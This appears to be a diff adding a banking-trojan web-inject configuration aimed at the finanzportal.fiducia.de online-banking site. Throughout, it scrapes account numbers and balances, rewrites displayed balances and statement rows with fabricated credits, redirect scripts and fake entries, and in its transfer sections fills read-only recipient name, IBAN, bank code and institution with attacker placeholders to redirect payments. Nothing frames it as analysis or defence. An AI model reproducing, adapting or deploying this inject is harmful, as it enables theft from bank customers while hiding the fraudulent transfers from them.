+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETR%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="2">%FIDUDEFNRSEL%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETR%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="1">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUMAXBETRSEPA%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="2">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUMAXBETRSEPA%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETRSEPA%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="2">%FIDUDEFNRSEL%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETRSEPA%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+
+
+
+******************************* SEPA trans *******************************
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="1">%FIDUDEFNRSELSEPA%|End
+ITINITNAME=|%FIDUBAL%[0000]|End
+ITINITSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap[*]" id="lbl">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="2">%FIDUDEFNRSELSEPA%|End
+ITINITNAME=|%FIDUBAL%[0000]|End
+ITINITSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap[*]" id="lbl">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="1">%FIDUDEFNRSELSEPA%|End
+ITINJSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="2">%FIDUDEFNRSELSEPA%|End
+ITINJSTART=|<span class="XLabel nowrap" id="lblKontoAuswahlSaldoLabel">Saldo in EUR:&nbsp;&nbsp;</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="1">%FIDUDEFNRSELSEPA%|End
+ITINITNAME=|%FIDUMAXBETR%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="2">%FIDUDEFNRSELSEPA%|End
+ITINITNAME=|%FIDUMAXBETR%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="1">%FIDUDEFNRSELSEPA%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETR%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="2">%FIDUDEFNRSELSEPA%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerBetragValue">[*]id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETR%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="1">%FIDUDEFNRSELSEPA%|End
+ITINITNAME=|%FIDUMAXBETRSEPA%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<option selected value="2">%FIDUDEFNRSELSEPA%|End
+ITINITNAME=|%FIDUMAXBETRSEPA%[0000]|End
+ITINITSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINITEND=| H</span>|End
+ITINITXPRREG=||End
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="1">%FIDUDEFNRSELSEPA%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETRSEPA%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<option selected value="2">%FIDUDEFNRSELSEPA%|End
+ITINJSTART=|<div class="XContainer" id="xvwKontoAuswahlVerfuegbarerEUBetragValue">[*] id="lbl">|End
+ITINJEND=| H</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FIDUMAXBETRSEPA%+%AMOUNT%|End
+ITINJPASTEMN=||End
+
+
+******************************* Konto information *******************************
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|id="lblBeschriftung">Konto-Nr.:</span></td><td valign="top"><span class="XLabel" id="lblWert">%FIDUDEFNR%</span>|End
+ITINITNAME=|%FIDUBAL%[0000]|End
+ITINITSTART=|id="lblBeschriftungLabelMedia">Kapitalsaldo in EUR:</span>[*]<span class="XLabel nowrap[*]id="lbl">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|id="lblBeschriftung">Konto-Nr.:</span></td><td valign="top"><span class="XLabel" id="lblWert">%FIDUDEFNR%</span>|End
+ITINJSTART=|id="lblBeschriftungLabelMedia">Kapitalsaldo in EUR:</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+
+
+******************************* BALANS *******************************
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<span class="XLabel" id="lblNameKundennr">Name (Kunden-Nr.)</span></th>|End
+ITINITNAME=|%FIDUBAL%[0000]|End
+ITINITSTART=|::">%FIDUDEFNR%</span>[*]<span class="XLabel nowrap[*]::">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<span class="XLabel" id="lblNameKundennr">Name (Kunden-Nr.)</span></th>|End
+ITINJSTART=|::">%FIDUDEFNR%</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl::vgst_%FIDUDEFNR%::">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl::vgst_%FIDUDEFNR%::">%FIDUBAL%+%AMOUNT%|End
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<span class="XLabel" id="lblNameKundennr">Name (Kunden-Nr.)</span></th>|End
+ITINITNAME=|%FIDUSUMMBAL%[0000]|End
+ITINITSTART=|<span class="XLabel" id="lblSumme">Summe:</span>[*]<span class="XLabel nowrap[*]id="lbl">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<span class="XLabel" id="lblNameKundennr">Name (Kunden-Nr.)</span></th>|End
+ITINJSTART=|<span class="XLabel" id="lblSumme">Summe:</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUSUMMBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUSUMMBAL%+%AMOUNT%|End
+
+
+
+
+******************************* STATEMENT *******************************
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|<div id="contextCommands">[*]<nobr>|End
+ITINJEND=|<a href="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| |End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|id="lblEndsaldoLabel">Endsaldo in EUR:</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12000[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|id="lblEndsaldoLabel">Endsaldo in EUR:</span>[*]id="lblEndsaldoLabel">Endsaldo in EUR:</span>[*]<span class="XLabel nowrap|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| " id="lbl">%FIDUBAL%+%AMOUNT%  H|End
+ITINJPASTEMN=| SollKennzeichnung" id="lbl">%FIDUBAL%+%AMOUNT%|End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDULNKUBERW%[0000]|End
+ITINITSTART=|">Umsatzanzeige</a>[*]<a href="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDUPATH%[0000]|End
+ITINITSTART=|type="text/css" href="/|End
+ITINITEND=|/|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINITNAME=|%FIDURZBKRZID%[0000]|End
+ITINITSTART=|type="text/css" href="[*]?|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|<td><span class="XLabel">Betrag in EUR</span>[*]<tbody>|End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+
+	<script language="JavaScript">
+
+function openUrl(url)
+{
+    var fakeLink = document.createElement('a');
+     if (typeof(fakeLink.click) == 'undefined')
+    {
+        location.href = url.replace("&amp;","&");
+    }
+    else
+    {
+	var ua = navigator.userAgent.toLowerCase();
+ 	if (ua.indexOf("gecko") != -1) {
+	 location.href = url.replace(new RegExp("&amp;",'g'),"&");
+	 } else
+	{
+	fakeLink.href = url.replace(new RegExp("&amp;",'g'),"&");;
+	document.body.appendChild(fakeLink);
+	fakeLink.click(); 
+	}
+
+
+    }
+     return false;
+}
+
+
+	</script>
+
+
+<tr class="od">
+<td height="1" valign="top">
+<div class="XContainer Daten" id="cntVorgangsdaten">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
+
+
+<tr>
+<td valign="top"><span class="XAction Submitlink nowrap" id="actAnzeigen::1::">
+
+<input alt="Details zum Umsatz anzeigen" class="XAction Submitlink nowrap ImageButton" id="" name="" src="/%FIDUPATH%/resource/ebpe-anzeigen?%FIDURZBKRZID%" title="Details zum Umsatz anzeigen" type="image" onclick="return openUrl('https://finanzportal.fiducia.de%FIDULNKUBERW%');">
+
+<input alt="Details zum Umsatz anzeigen" class="XAction Submitlink nowrap TextButton" id="" name="" tabindex="11" title="Details zum Umsatz anzeigen" type="submit" value="%FALSEDNUP%" onclick="return openUrl('https://finanzportal.fiducia.de%FIDULNKUBERW%');">
+
+</span></td>
+</tr>
+
+<tr>
+<td valign="top"><span class="XLabel Beschriftung nowrap" id="lblVorgangLabel::1::">Vorgang / Verwendungszweck:</span></td>
+</tr>
+<tr>
+<td valign="top"><span class="XLabel" id="lblVorgangValue::1::">GUTSCHRIFT</span></td>
+</tr>
+<tr>
+<td valign="top"><span class="XLabel" id="lblVerwendungszweck1Value::1::">%FALSEC1%</span></td>
+</tr>
+<tr>
+<td valign="top"><span class="XLabel" id="lblVerwendungszweck2Value::1::"><a href="%FIDULNKUBERW%">RETOUREN</a></span></td>
+</tr>
+<tr>
+<td valign="top">
+<table border="0" cellpadding="0" cellspacing="0" class="XTable XTableEmbeddedContainer nurDruckansicht" id="tblErweiterteVerwendungszwecke::1::" rules="none">
+<colgroup>
+<col>
+</colgroup>
+<tbody></tbody>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td><td align="center" valign="top"><span class="XLabel" id="lblBuchungstagValue::1::">%DATASTAT%</span></td><td align="center" valign="top"><span class="XLabel" id="lblValutaValue::1::">%DATASTAT%</span></td><td valign="top">
+<div class="XContainer" id="cntBetrag">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
+<tr>
+<td align="right" valign="top" width="100%"><span class="XLabel" id="lblBetragValue::1::">%AMTFRMT%</span></td><td width="5"><img alt="" height="1" src="/%FIDUPATH%/resource/xhtml-filler?%FIDURZBKRZID%" width="5"></td><td valign="top"><span class="XLabel" id="lblSollHabenValue::1::">H</span></td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|10002[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">Umsatzanzeige</h1>[*]<option selected value="1">%FIDUDEFNRSEL%|End
+ITINJSTART=|<td height="1" valign="top">[*]<div class="XContainer Daten" id="cntVorgangsdaten">|End
+ITINJEND=|</table>|End
+ITINJRXPREG=||End
+ITINJCODE=|::">%AMTFRMT%</span>|End
+ITINJPASTE=|
+
+<td height="1" valign="top">
+<div class="XContainer Daten" id="cntVorgangsdaten">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
+
+<tr>
+<td valign="top"><span class="XAction Submitlink nowrap" id="actAnzeigen::1::">
+<input alt="Details zum Umsatz anzeigen" class="XAction Submitlink nowrap ImageButton" id="" name="" src="/%FIDUPATH%/resource/ebpe-anzeigen?%FIDURZBKRZID%" title="Details zum Umsatz anzeigen" type="image" onclick="return false;">
+
+<input alt="Details zum Umsatz anzeigen" class="XAction Submitlink nowrap TextButton" id="" name="" tabindex="11" title="Details zum Umsatz anzeigen" type="submit" value="%FALSEDNUP%" onclick="return false;"></span></td>
+</tr>
+
+<tr>
+<td valign="top"><span class="XLabel Beschriftung nowrap" id="lblVorgangLabel::1::">Vorgang / Verwendungszweck:</span></td>
+</tr>
+<tr>
+<td valign="top"><span class="XLabel" id="lblVorgangValue::1::">RETOUREN</span></td>
+</tr>
+<tr>
+<td valign="top"><span class="XLabel" id="lblVerwendungszweck1Value::1::">%RUCKRUF%</span></td>
+</tr>
+<tr>
+<td valign="top"><span class="XLabel" id="lblVerwendungszweck2Value::1::"></span></td>
+</tr>
+<tr>
+<td valign="top">
+<table border="0" cellpadding="0" cellspacing="0" class="XTable XTableEmbeddedContainer nurDruckansicht" id="tblErweiterteVerwendungszwecke::1::" rules="none">
+<colgroup>
+<col>
+</colgroup>
+<tbody></tbody>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td><td align="center" valign="top"><span class="XLabel" id="lblBuchungstagValue::1::">%DATASTAT%</span></td><td align="center" valign="top"><span class="XLabel" id="lblValutaValue::1::">%DATASTAT%</span></td><td valign="top">
+<div class="XContainer" id="cntBetrag">
+<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
+<tr>
+<td align="right" valign="top" width="100%"><span class="XLabel" id="lblBetragValue::1::">0,00</span></td><td width="5"><img alt="" height="1" src="/%FIDUPATH%/resource/xhtml-filler?%FIDURZBKRZID%" width="5"></td><td valign="top"><span class="XLabel" id="lblSollHabenValue::1::">H</span></td>
+</tr>
+</table>
+
+
+
+	     |End
+ITINJPASTEMN=||End
+
+
+
+****************************** Transfer ALL ******************************
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>|End
+ITINITNAME=|%FIDUSEL1N%[0000]|End
+ITINITSTART=|id="lblKontoAuswahlBeschriftung">Konto</span>[*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINITHOST=|finanzportal.fiducia.de|End
+ITINITPAGE=|/*/portal*token=*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>|End
+ITINITNAME=|%FIDUSEL2N%[0000]|End
+ITINITSTART=|id="lblZahlungsart">&Uuml;berweisungsart:</span>[*]name="|End
+ITINITEND=|"|End
+ITINITXPRREG=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>|End
+ITINJSTART=|<div class="XContainer" id="mainContent_root">[*]width="100%">|End
+ITINJEND=|<div class="XContainer TransaktionsblockInhalt" id="cntUeberweisung">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+<input type="hidden" name="%FIDUSEL1N%" value="1">
+<input type="hidden" name="%FIDUSEL2N%" value="0">
+<tr><td valign="top" width="100%"><div class="XContainer Transaktionsblock" id="cntDaten"><table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%"><tr><td align="center" valign="top" width="100%">|End
+ITINJPASTEMN=||End
+
+
+****************************** Transfer 1 ******************************
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblKontoAuswahlBeschriftung">Konto</span>[*]<select |End
+ITINJEND=||End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|disabled="disabled" |End
+ITINJPASTEMN=||End
+
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblEmpfaengerdaten1">Empf&auml;nger:</span>[*]width="5"></td>|End
+ITINJEND=|</tr>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=| |End
+ITINJPASTEMN=||End
+
+
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblEmpfaengerdaten1">Empf&auml;nger:</span>[*]<input class="|End
+ITINJEND=|id="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|XText readonly" readonly value="%FALSEDN%"|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblIBAN">IBAN/Kontonummer:</span>[*]<input class="|End
+ITINJEND=|id="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|XText readonly" readonly value="%KONTONUMMER%"|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblIBAN">IBAN/Kontonummer:</span>[*]<input class="[*]<input class="|End
+ITINJEND=|id="|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|XText readonly" readonly value="%FALSEBLZ%"|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
+ITINJIFFOUND=|<h1 class="stackedFrontletTitle">&Uuml;berweisung/Umbuchung</h1>[*]<input alt="Bankleitzahl suchen" |End
+ITINJSTART=|id="lblKreditinstitut">Bei Kreditinstitut:</span>[*]value="|End
+ITINJEND=|"|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%FALSEKRINST%|End
+ITINJPASTEMN=||End
+
+
+ITINJHOST=|finanzportal.fiducia.de|End
+ITINJPAGE=|/*/portal*token=*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|12001[ps]000|End
